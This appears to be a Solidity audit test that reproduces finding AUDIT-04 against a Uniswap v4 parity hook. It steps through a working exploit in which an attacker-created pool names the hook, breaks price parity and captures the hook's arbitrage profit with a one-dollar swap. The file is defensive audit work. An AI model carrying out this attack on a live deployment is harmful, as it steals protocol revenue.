// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/Test.sol";
import {HookBaseTest} from "./HookBase.t.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {MockStockToken} from "../mocks/MockStockToken.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";

/// @notice Adversarial probes against the parity hook.
contract HookAuditTest is HookBaseTest {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    address attacker = makeAddr("attacker");
    MockStockToken rogue;
    PoolKey rogueKey;

    /// @notice AUDIT-04. The hook donates its arbitrage profit to whichever pool triggered it,
    ///         and never checks that pool is one of its own. v4 pools are permissionless and any
    ///         pool may name any hook, so an attacker can stand up a pool nobody else uses, point
    ///         it at Aarka's hook, and have the protocol's arbitrage revenue paid into it.
    function test_AUDIT04_attackerStealsTheArbitrageProfit() public {
        // 1. The attacker's own pool, quoted in USDG so a donation lands in a currency the hook
        //    actually holds, wearing Aarka's hook.
        rogue = new MockStockToken("Rogue", "ROGUE");
        rogueKey = _key(address(rogue), address(usdg), IHooks(address(hook)));
        manager.initialize(rogueKey, _sqrtPrice(rogueKey, address(rogue), 1e6));

        rogue.mint(attacker, 1_000_000e18);
        usdg.mint(attacker, 1_000_000e6);
        vm.startPrank(attacker);
        rogue.approve(address(liquidityRouter), type(uint256).max);
        usdg.approve(address(liquidityRouter), type(uint256).max);
        rogue.approve(address(swapRouter), type(uint256).max);
        usdg.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();

        vm.prank(attacker);
        _addLiquidityAs(rogueKey);

        // 2. Break parity through the underlying pool, which carries no hook and therefore does
        //    not heal itself. The dislocation is now sitting there, unclaimed.
        _swap(underlyingKey, !_isZero(underlyingKey, address(nvda)), -int256(uint256(200_000e6)));
        uint256 gapBefore = parityGapBps();
        assertGt(gapBefore, 30, "parity is broken and nothing has fixed it");

        (uint256 g0Before, uint256 g1Before) = IPoolManager(address(manager)).getFeeGrowthGlobals(rogueKey.toId());

        // 3. A one-dollar swap in the attacker's own pool. That is the whole attack.
        vm.prank(attacker);
        swapRouter.swap(
            rogueKey,
            IPoolManager.SwapParams({
                zeroForOne: _isZero(rogueKey, address(usdg)),
                amountSpecified: -int256(uint256(1e6)),
                sqrtPriceLimitX96: _isZero(rogueKey, address(usdg))
                    ? 4295128740
                    : 1461446703485210103287273052203988822378723970341
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );

        (uint256 g0After, uint256 g1After) = IPoolManager(address(manager)).getFeeGrowthGlobals(rogueKey.toId());
        uint256 stolen = (g0After - g0Before) + (g1After - g1Before);

        console.log("parity gap before the attack (bps):", gapBefore);
        console.log("parity gap after  the attack (bps):", parityGapBps());
        console.log("fee growth donated into the attacker's pool:", stolen);

        assertGt(parityGapBps(), 30, "FIXED: the hook refuses to act for a pool it does not know");

        // Control: the identical swap with parity intact, so any difference is the donation.
        uint256 baseline = _feeGrowthFromAnIdenticalSwapWithNoDislocation();
        console.log("fee growth from the same swap, parity intact:", baseline);
        assertEq(stolen, baseline, "FIXED: the attacker earns only their own swap fee, nothing more");
    }

    /// @dev Same rogue pool, same one-dollar swap, but no parity gap for the hook to capture. What
    ///      accrues here is purely the attacker's own LP fee on their own trade.
    function _feeGrowthFromAnIdenticalSwapWithNoDislocation() internal returns (uint256) {
        setUp();
        rogue = new MockStockToken("Rogue", "ROGUE");
        rogueKey = _key(address(rogue), address(usdg), IHooks(address(hook)));
        manager.initialize(rogueKey, _sqrtPrice(rogueKey, address(rogue), 1e6));

        rogue.mint(attacker, 1_000_000e18);
        usdg.mint(attacker, 1_000_000e6);
        vm.startPrank(attacker);
        rogue.approve(address(liquidityRouter), type(uint256).max);
        usdg.approve(address(liquidityRouter), type(uint256).max);
        rogue.approve(address(swapRouter), type(uint256).max);
        usdg.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
        vm.prank(attacker);
        _addLiquidity(rogueKey);

        (uint256 a0, uint256 a1) = IPoolManager(address(manager)).getFeeGrowthGlobals(rogueKey.toId());
        vm.prank(attacker);
        swapRouter.swap(
            rogueKey,
            IPoolManager.SwapParams({
                zeroForOne: _isZero(rogueKey, address(usdg)),
                amountSpecified: -int256(uint256(1e6)),
                sqrtPriceLimitX96: _isZero(rogueKey, address(usdg))
                    ? 4295128740
                    : 1461446703485210103287273052203988822378723970341
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        (uint256 b0, uint256 b1) = IPoolManager(address(manager)).getFeeGrowthGlobals(rogueKey.toId());
        return (b0 - a0) + (b1 - a1);
    }

    function _isZero(PoolKey memory key, address t) internal pure returns (bool) {
        return Currency.unwrap(key.currency0) == t;
    }

    function _addLiquidityAs(PoolKey memory key) internal {
        _addLiquidity(key);
    }

}
